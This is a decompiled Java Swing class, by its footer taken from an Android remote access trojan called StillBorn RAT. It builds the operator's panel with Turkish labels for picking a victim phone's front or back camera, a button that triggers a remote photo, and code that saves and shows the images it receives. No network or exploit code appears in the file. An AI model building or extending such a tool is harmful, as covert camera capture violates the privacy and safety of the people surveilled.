/*   1:    */ package gui.panel;
/*   2:    */ 
/*   3:    */ import gui.UserGUI;
/*   4:    */ import java.awt.Graphics2D;
/*   5:    */ import java.awt.Image;
/*   6:    */ import java.awt.RenderingHints;
/*   7:    */ import java.awt.event.ActionEvent;
/*   8:    */ import java.awt.event.ActionListener;
/*   9:    */ import java.awt.event.MouseAdapter;
/*  10:    */ import java.awt.event.MouseEvent;
/*  11:    */ import java.awt.image.BufferedImage;
/*  12:    */ import java.io.File;
/*  13:    */ import java.io.FileOutputStream;
/*  14:    */ import java.io.IOException;
/*  15:    */ import java.util.ArrayList;
/*  16:    */ import java.util.Date;
/*  17:    */ import javax.imageio.ImageIO;
/*  18:    */ import javax.swing.GroupLayout;
/*  19:    */ import javax.swing.GroupLayout.Alignment;
/*  20:    */ import javax.swing.GroupLayout.ParallelGroup;
/*  21:    */ import javax.swing.GroupLayout.SequentialGroup;
/*  22:    */ import javax.swing.ImageIcon;
/*  23:    */ import javax.swing.JButton;
/*  24:    */ import javax.swing.JComboBox;
/*  25:    */ import javax.swing.JLabel;
/*  26:    */ import javax.swing.JList;
/*  27:    */ import javax.swing.JPanel;
/*  28:    */ import javax.swing.JSplitPane;
/*  29:    */ import javax.swing.LayoutStyle.ComponentPlacement;
/*  30:    */ import javax.swing.border.EtchedBorder;
/*  31:    */ import javax.swing.border.TitledBorder;
/*  32:    */ 
/*  33:    */ public class PicturePanel
/*  34:    */   extends JPanel
/*  35:    */ {
/*  36:    */   private JLabel imgLabel;
/*  37:    */   private JPanel panel;
/*  38:    */   private JComboBox comboBox;
/*  39:    */   private UserGUI gui;
/*  40:    */   private JSplitPane splitPane;
/*  41:    */   private JPanel panel_1;
/*  42:    */   private JList list;
/*  43:    */   private JPanel panel_2;
/*  44: 65 */   private String lastTitle = "";
/*  45: 66 */   private ArrayList<String> listAddr = new ArrayList();
/*  46:    */   
/*  47:    */   public PicturePanel(UserGUI gui)
/*  48:    */   {
/*  49: 72 */     this.gui = gui;
/*  50:    */     
/*  51: 74 */     Object[] items = { "Arka Kamera", "Ön Kamera" };
/*  52:    */     
/*  53: 76 */     this.splitPane = new JSplitPane();
/*  54: 77 */     this.splitPane.setResizeWeight(1.0D);
/*  55: 78 */     GroupLayout groupLayout = new GroupLayout(this);
/*  56: 79 */     groupLayout.setHorizontalGroup(
/*  57: 80 */       groupLayout.createParallelGroup(GroupLayout.Alignment.TRAILING)
/*  58: 81 */       .addGroup(groupLayout.createSequentialGroup()
/*  59: 82 */       .addContainerGap()
/*  60: 83 */       .addComponent(this.splitPane, -1, 501, 32767)
/*  61: 84 */       .addContainerGap()));
/*  62:    */     
/*  63: 86 */     groupLayout.setVerticalGroup(
/*  64: 87 */       groupLayout.createParallelGroup(GroupLayout.Alignment.TRAILING)
/*  65: 88 */       .addGroup(GroupLayout.Alignment.LEADING, groupLayout.createSequentialGroup()
/*  66: 89 */       .addContainerGap()
/*  67: 90 */       .addComponent(this.splitPane, -1, 400, 32767)
/*  68: 91 */       .addContainerGap()));
/*  69:    */     
/*  70:    */ 
/*  71: 94 */     this.panel = new JPanel();
/*  72: 95 */     this.splitPane.setLeftComponent(this.panel);
/*  73: 96 */     this.panel.setBorder(new EtchedBorder(1, null, null));
/*  74:    */     
/*  75: 98 */     this.imgLabel = new JLabel();
/*  76: 99 */     this.panel.add(this.imgLabel);
/*  77:    */     
/*  78:101 */     this.panel_1 = new JPanel();
/*  79:102 */     this.splitPane.setRightComponent(this.panel_1);
/*  80:    */     
/*  81:104 */     this.list = new JList();
/*  82:105 */     this.list.addMouseListener(new MouseAdapter()
/*  83:    */     {
/*  84:    */       public void mouseClicked(MouseEvent e)
/*  85:    */       {
/*  86:108 */         PicturePanel.this.fireMouseClickedInList();
/*  87:    */       }
/*  88:111 */     });
/*  89:112 */     this.panel_2 = new JPanel();
/*  90:113 */     this.panel_2.setBorder(new TitledBorder(null, "Ayarlar", 4, 2, null, null));
/*  91:114 */     GroupLayout gl_panel_1 = new GroupLayout(this.panel_1);
/*  92:115 */     gl_panel_1.setHorizontalGroup(
/*  93:116 */       gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  94:117 */       .addGroup(GroupLayout.Alignment.TRAILING, gl_panel_1.createSequentialGroup()
/*  95:118 */       .addContainerGap()
/*  96:119 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.TRAILING)
/*  97:120 */       .addComponent(this.list, GroupLayout.Alignment.LEADING, -1, 210, 32767)
/*  98:121 */       .addComponent(this.panel_2, GroupLayout.Alignment.LEADING, -1, 210, 32767))
/*  99:122 */       .addContainerGap()));
/* 100:    */     
/* 101:124 */     gl_panel_1.setVerticalGroup(
/* 102:125 */       gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 103:126 */       .addGroup(GroupLayout.Alignment.TRAILING, gl_panel_1.createSequentialGroup()
/* 104:127 */       .addContainerGap()
/* 105:128 */       .addComponent(this.list, -1, 165, 32767)
/* 106:129 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 107:130 */       .addComponent(this.panel_2, -2, -1, -2)
/* 108:131 */       .addContainerGap()));
/* 109:    */     
/* 110:133 */     this.comboBox = new JComboBox(items);
/* 111:    */     
/* 112:135 */     JButton btnTakePicture = new JButton("Resim çek");
/* 113:136 */     btnTakePicture.addActionListener(new ActionListener()
/* 114:    */     {
/* 115:    */       public void actionPerformed(ActionEvent e)
/* 116:    */       {
/* 117:138 */         PicturePanel.this.fireTakePicture();
/* 118:    */       }
/* 119:140 */     });
/* 120:141 */     GroupLayout gl_panel_2 = new GroupLayout(this.panel_2);
/* 121:142 */     gl_panel_2.setHorizontalGroup(
/* 122:143 */       gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 123:144 */       .addGroup(GroupLayout.Alignment.TRAILING, gl_panel_2.createSequentialGroup()
/* 124:145 */       .addContainerGap()
/* 125:146 */       .addGroup(gl_panel_2.createParallelGroup(GroupLayout.Alignment.TRAILING)
/* 126:147 */       .addComponent(btnTakePicture, GroupLayout.Alignment.LEADING, -1, 178, 32767)
/* 127:148 */       .addComponent(this.comboBox, GroupLayout.Alignment.LEADING, 0, 178, 32767))
/* 128:149 */       .addContainerGap()));
/* 129:    */     
/* 130:151 */     gl_panel_2.setVerticalGroup(
/* 131:152 */       gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 132:153 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 133:154 */       .addContainerGap()
/* 134:155 */       .addComponent(this.comboBox, -2, -1, -2)
/* 135:156 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED, -1, 32767)
/* 136:157 */       .addComponent(btnTakePicture)
/* 137:158 */       .addGap(18)));
/* 138:    */     
/* 139:160 */     this.panel_2.setLayout(gl_panel_2);
/* 140:161 */     this.panel_1.setLayout(gl_panel_1);
/* 141:162 */     setLayout(groupLayout);
/* 142:    */   }
/* 143:    */   
/* 144:    */   private void fireTakePicture()
/* 145:    */   {
/* 146:166 */     this.gui.fireTakePicture();
/* 147:    */   }
/* 148:    */   
/* 149:    */   private void fireMouseClickedInList()
/* 150:    */   {
/* 151:170 */     String title = (String)this.list.getSelectedValue();
/* 152:171 */     if (!this.lastTitle.equals(title)) {
/* 153:    */       try
/* 154:    */       {
/* 155:173 */         this.lastTitle = title;
/* 156:174 */         Image image = scaleImage(ImageIO.read(new File(title)), 560, 420);
/* 157:175 */         ImageIcon icon = new ImageIcon(image);
/* 158:176 */         this.imgLabel.setIcon(icon);
/* 159:177 */         repaint();
/* 160:178 */         validate();
/* 161:    */       }
/* 162:    */       catch (IOException localIOException) {}
/* 163:    */     }
/* 164:    */   }
/* 165:    */   
/* 166:    */   public void updateImage(byte[] data)
/* 167:    */   {
/* 168:    */     try
/* 169:    */     {
/* 170:186 */       String title = "download/" + new Date(System.currentTimeMillis()).toString().replaceAll(" ", "_") + ".jpeg";
/* 171:187 */       FileOutputStream out = new FileOutputStream(title);
/* 172:188 */       out.write(data);
/* 173:189 */       out.close();
/* 174:    */       
/* 175:191 */       Image image = scaleImage(ImageIO.read(new File(title)), 560, 420);
/* 176:192 */       ImageIcon icon = new ImageIcon(image);
/* 177:193 */       this.imgLabel.setIcon(icon);
/* 178:194 */       repaint();
/* 179:195 */       validate();
/* 180:    */       
/* 181:197 */       this.lastTitle = title;
/* 182:198 */       this.listAddr.add(title);
/* 183:199 */       this.list.setListData(this.listAddr.toArray());
/* 184:200 */       this.list.setSelectedValue(title, true);
/* 185:    */     }
/* 186:    */     catch (Exception e)
/* 187:    */     {
/* 188:203 */       this.gui.errLogTxt(System.currentTimeMillis(), "Resim alırken hata oluştu");
/* 189:    */     }
/* 190:    */   }
/* 191:    */   
/* 192:    */   public static Image scaleImage(Image source, int width, int height)
/* 193:    */   {
/* 194:208 */     BufferedImage img = new BufferedImage(width, height, 2);
/* 195:209 */     Graphics2D g = (Graphics2D)img.getGraphics();
/* 196:210 */     g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
/* 197:211 */     g.drawImage(source, 0, 0, width, height, null);
/* 198:212 */     g.dispose();
/* 199:213 */     return img;
/* 200:    */   }
/* 201:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     gui.panel.PicturePanel
 * JD-Core Version:    0.7.0.1
 */